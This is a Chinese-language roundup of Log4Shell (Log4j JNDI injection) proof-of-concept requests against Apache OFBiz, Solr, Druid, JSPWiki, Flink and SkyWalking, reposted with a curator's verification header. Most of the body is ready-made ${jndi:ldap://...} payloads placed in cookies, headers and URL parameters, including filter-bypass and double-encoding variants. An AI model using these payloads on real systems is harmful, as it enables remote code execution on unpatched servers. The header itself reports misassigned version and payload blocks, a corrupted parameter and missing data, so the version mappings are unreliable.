---
source: "MrWQ/vulnerability-paper"
product: "Log4Shell affected-products reference"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Log4j 和它的小伙伴们"
prerequisites: "来源所述条件，未列明部分仍待核：OFBiz<18.12.03, Solr7.4.0–7.7.3/8.0.0–<8.11.1, JSPWiki2.11.0, Flink branches, SkyWalking<8.9.1; Druid missing"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/VGMxrw8HD2ZbQHpyL-V_nQ"
id: "vw-c8b292ce65097945c979ba7f"
entity_id: "ve-c8b292ce65097945c979ba7f"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：OFBiz&lt;18.12.03, Solr7.4.0–7.7.3/8.0.0–&lt;8.11.1, JSPWiki2.11.0, Flink branches, SkyWalking&lt;8.9.1; Druid missing

代码与实验材料：Multiple product request snippets but sections shifted; no observed responses or environment evidence

来源证据范围：Original WeChat permalink supplied; product advisory sources missing

- **事实待核（1）**：Payload/version blocks assigned to wrong headings；依据：JSPWiki 影响版本 contains /druid/v2; Filnk 影响版本 contains /Edit.jsp; SkyWalking 影响版本 contains /jars/...。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **代码与转录边界（2）**：HTML entity conversion corrupted request parameter；依据：entry-class=1¶llelism=1。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（3）**：Druid version blank and SkyWalking payload absent; product typos。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Log4j 和它的小伙伴们

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VGMxrw8HD2ZbQHpyL-V_nQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSO92ptAseEBBMfHZzG1qsqRdg64cG2Gn7SMXbD29AKjibe2s51gODWXcQJmHrJZN6K8icDVA6ia4Ih1A/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

Apche OFBiz

影响版本

```
OFBiz < v18.12.03
```

poc

```
GET: https://0.0.0.0:8443/webtools/control/main
Cookie: OFBiz.Visitor=${jndi:ldap://0.0.0.0/123}
```

```
POST: https://0.0.0.0:8443/webtools/control/setLocaleFromBrowser
Content-Type: text/html;charset=UTF-8${jndi:ldap://0.0.0.0/123}
```

Apache Solr  

影响版本

```
v7.4.0 <= Solr <= v7.7.3
v8.0.0 <= Solr < v8.11.1
```

poc

```
/solr/admin/cores?action=CREATE&name=$%7Bjndi:ldap://0.0.0.0/123%7D&wt=json
```

```
/solr/admin/info/system?_=${jndi:ldap://0.0.0.0/123}&wt=json
```

```
/solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=${jndi:ldap://0.0.0.0/123}&name=&schema=&wt=
```

Apache Druid

影响版本

poc

burp 传 payload，阻止 url 编码

```
http://0.0.0.0:8888/druid/coordinator/${jndi:ldap://0.0.0.0/123}
```

```
http://0.0.0.0:8888/druid/indexer/${jndi:ldap://0.0.0.0/123}
```

Apache JSPWiki

影响版本

```
http://0.0.0.0:8888/druid/v2/${jndi:ldap://0.0.0.0/123}
```

poc

```
JSPWiki = V2.11.0
```

有过滤，需要使用绕过语句触发

```
docker pull apache/jspwiki:release-2.11.0
docker run -d -p 8080:8080 apache/jspwiki:release-2.11.0
```

```
http://0.0.0.0:8080/wiki/$%7Bjndi:ldap:$%7B::-/%7D/0.0.0.0/123%7D
```

Apache Filnk

影响版本

```
http://0.0.0.0:8080/Edit.jsp?page=Main
X-Forwarded-For:${jndi:dns://0.0.0.0/123}
```

poc

```
四个系列：< v1.14.2, < v1.13.5, < v1.12.7, < v1.11.6
```

url 双编码绕过 //

```
GET: http://0.0.0.0:8081/jars/11.jar/plan?entry-class=1¶llelism=1${jndi:dns://0.0.0.0/123}&program-args=1
```

Apache SkyWalking

影响版本

```
POST: http://0.0.0.0:8081/jars/${jndi:ldap:%252f%252f0.0.0.0%252f123}.jar/run
```

poc

```
SkyWalking < v8.9.1
```

.......

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
